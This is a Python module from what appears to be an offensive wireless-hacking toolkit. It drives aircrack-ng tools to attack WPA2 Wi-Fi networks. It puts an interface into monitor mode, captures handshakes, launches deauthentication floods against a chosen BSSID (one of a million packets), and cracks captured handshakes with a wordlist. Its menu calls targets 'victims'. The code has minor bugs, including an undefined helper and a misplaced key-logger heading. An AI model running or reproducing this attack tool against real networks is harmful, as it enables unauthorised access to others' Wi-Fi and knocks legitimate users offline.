from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from re import findall
from time import sleep


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def print_wpa2_options(inputs_dict):
    descriptions = {
        'IFACE':'This is the wireless interface',
        'BSSID': 'Mac address of the attacking router',
        'CHANNEL': 'Attacking channel of the interface',
        'WORDLIST': 'Full path to the wordlist',
        'HANDSHAKE': 'Full path to the captured wordlist'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError:
            pass

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def show_interfaces():
    interfaces = check_output("iwconfig", shell=True, stderr=devnull, stdin=devnull)
    if interfaces == b'':
        print(colors.Red + '[✘]You have no wifi interface connected!' + colors.RESET)
    else:
        names = findall("(.*)(?:\s*IEEE.*)", interfaces.decode('utf-8'))
        for index, name in enumerate(names):
            print(f'\t{index + 1} --> {name}')


def show_wireless_networks(settings):
    command =  "airmon-ng check kill;"
    command += f"ifconfig {settings['IFACE']} down;"
    command += f"iwconfig {settings['IFACE']} mode monitor;"
    command += f"ifconfig {settings['IFACE']} up;clear;"
    command += f"airodump-ng {settings['IFACE']};"
    command += f"ifconfig {settings['IFACE']} down;"
    command += f"iwconfig {settings['IFACE']} mode managed;"
    command += f"ifconfig {settings['IFACE']} up;exit;"
    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)


def capture_hand_shake(settings):
    global program_path
    try:
        call('mkdir {}/handshakes'.format(program_path), shell=True)
        print(colors.Green + '[✔]Handshakes folder created' + colors.RESET)
    except:
        pass

    command =  "airmon-ng check kill;"
    command += f"ifconfig {settings['IFACE']} down;"
    command += f"iwconfig {settings['IFACE']} mode monitor;"
    command += f"ifconfig {settings['IFACE']} up;clear;"
    command += f"airodump-ng --bssid {settings['BSSID']} --channel {settings['CHANNEL']} --write {settings['HANDSHAKE']} {settings['IFACE']};"
    command += f"ifconfig {settings['IFACE']} down;"
    command += f"iwconfig {settings['IFACE']} mode managed;"
    command += f"ifconfig {settings['IFACE']} up;clear;exit"

    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Listener for hanshakes started' + colors.RESET)

    sleep(3)

    command =  f"aireplay-ng --deauth 10 -a {settings['BSSID']} {settings['IFACE']};exit;"
    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Deauthentication attack started' + colors.RESET)


def deauthenticating_attack(settings):
    command = f"airmon-ng start {settings['IFACE']} {settings['CHANNEL']};clear;"
    command += f"aireplay-ng --deauth 1000000 -a {settings['BSSID']} {settings['IFACE']};exit"

    call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
    print(colors.Green + '[✔]Deauthentication attack started' + colors.RESET)


def crack_password(settings):
    global program_path
    try:
        f = open(settings['HANDSHAKE'], 'rb')
        f.close()
        f = open(settings['WORDLIST'], 'rb')
        f.close()

        command = f"aircrack-ng {settings['HANDSHAKE']} -w {settings['WORDLIST']};"
        command += f"python3 {program_path}/libs/wpa2/waiting.py;exit;"

        call("gnome-terminal -x bash -c '{} exec bash'".format(command), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
        print(colors.Green + '[✔]Password cracking started' + colors.RESET)

    except Exception as error:
        print(colors.Red + '[✘]Error: {}',format(error) + colors.RESET)



def activate():
    # from the begining used command line interface
    global activated_option
    global program_path

    saved_inputs_dict = {
        'IFACE':'wlan0',
        'BSSID': '00:00:00:00:00:00:',
        'CHANNEL': '6',
        'WORDLIST': f'{program_path}/handshakes/',
        'HANDSHAKE': f'{program_path}/handshakes/'
    }

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'clear':
            call('clear', shell=True)

        elif command == 'exit' or command == 'quit':
            activated_option.remove('/wpa2')
            break

        elif command == 'help':
            logo_printer.print_help()

        elif command == '' or command == ' ':
            pass

        elif command == 'show ifaces' or command == 'ifaces' or command == 'interfaces' or command == 'show interfaces':
            show_interfaces()

        elif command == 'networks' or command == 'bssids' or command == 'victims':
            show_wireless_networks(saved_inputs_dict)

        elif command == 'attack' or command == 'exploit' or command == 'run':
            capture_hand_shake(saved_inputs_dict)

        elif command == 'crack':
            crack_password(saved_inputs_dict)

        elif command == 'deauth' or command == 'deauthenticate' or command == 'cick':
            deauthenticating_attack(saved_inputs_dict)

        # if the command is show options then show options
        elif command == 'show options' or command == 'options':
            print_wpa2_options(saved_inputs_dict)

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            try:
                setting = command.split()[1]
                new_value = command.split()[2]
                saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
            except Exception as error:
                print(colors.Red + '[✘]Error: {}'.format(error) + colors.RESET)

        else:
            print(colors.Red + '[✘]Invalid comand' + colors.RESET)


activate()